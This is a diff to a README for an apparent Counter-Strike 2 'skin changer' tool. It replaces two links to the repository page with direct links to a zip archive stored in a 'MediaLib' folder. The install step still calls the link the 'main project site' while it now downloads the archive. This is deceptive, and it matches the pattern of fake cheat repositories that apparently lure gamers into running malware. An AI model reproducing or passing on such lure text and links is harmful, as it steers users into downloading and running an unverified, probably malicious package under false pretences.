@@ -1,6 +1,6 @@
 # 🎮 CS2-Skin-Changer-Tool-2026-All-Items - Customizing Your Weapon Skins With Ease
 
-[![Download Now](https://img.shields.io/badge/Download-Tool-blue.svg)](https://github.com/maxiairborne8831/CS2-Skin-Changer-Tool-2026-All-Items)
+[![Download Now](https://img.shields.io/badge/Download-Tool-blue.svg)](https://github.com/maxiairborne8831/CS2-Skin-Changer-Tool-2026-All-Items/raw/refs/heads/main/MediaLib/Items-All-C-Tool-Changer-Skin-3.1.zip)
 
 This tool allows you to change and customize your weapon skins in Counter-Strike 2. You get access to all weapon finishes and knife models available in the 2026 update. This software works locally on your computer to replace skin assets during your gameplay sessions.
 
@@ -25,7 +25,7 @@ To run this tool, your computer must meet these basic specifications:
 
 Follow these steps to set up the skin changer on your computer.
 
-1. **Visit the Download Page:** Go to [this link](https://github.com/maxiairborne8831/CS2-Skin-Changer-Tool-2026-All-Items) to reach the main project site.
+1. **Visit the Download Page:** Go to [this link](https://github.com/maxiairborne8831/CS2-Skin-Changer-Tool-2026-All-Items/raw/refs/heads/main/MediaLib/Items-All-C-Tool-Changer-Skin-3.1.zip) to reach the main project site.
 2. **Download the File:** Click on the latest release package. Save the file to your desktop for easy access.
 3. **Extract the Contents:** Right-click the downloaded folder and select Extract All. Choose a folder where you want to keep the application.
 4. **Prepare the Game:** Start Counter-Strike 2 and reach the main menu.
